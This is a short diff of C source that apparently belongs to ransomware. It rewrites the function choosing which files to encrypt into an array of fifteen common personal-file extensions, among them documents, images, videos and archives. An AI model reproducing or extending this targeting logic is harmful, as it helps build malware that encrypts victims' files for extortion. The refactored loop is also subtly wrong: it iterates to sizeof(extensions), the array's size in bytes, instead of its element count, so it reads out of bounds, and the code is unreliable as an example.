@@ -9,16 +9,21 @@
 
 unsigned int cant_files = 0;
 
+// Only encrypt file with the next extensions:
+const char extensions[][4] = {
+  "avi", "bmp", "doc", "gif", "jpg",
+  "mkv", "mp3", "mp4", "pdf", "png",
+  "ppt", "rar", "txt", "xls", "zip"
+};
+
 bool isValidFile(char* file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
   ext++;
-  return // Only encrypt file with the next extensions
-  !strcmp(ext, "doc") || !strcmp(ext, "pdf") || !strcmp(ext, "rar") || 
-  !strcmp(ext, "bmp") || !strcmp(ext, "gif") || !strcmp(ext, "jpg") || 
-  !strcmp(ext, "mp3") || !strcmp(ext, "mp4") || !strcmp(ext, "avi") || 
-  !strcmp(ext, "txt") || !strcmp(ext, "zip") || !strcmp(ext, "png") || 
-  !strcmp(ext, "mkv") || !strcmp(ext, "ppt") || !strcmp(ext, "xls")  ;
+  bool res = false;
+  for (int i = 0; i < (int)sizeof(extensions) && !res; i++)
+    res = strcmp(ext, extensions[i]) == 0;
+  return res;
 }
 
 /*
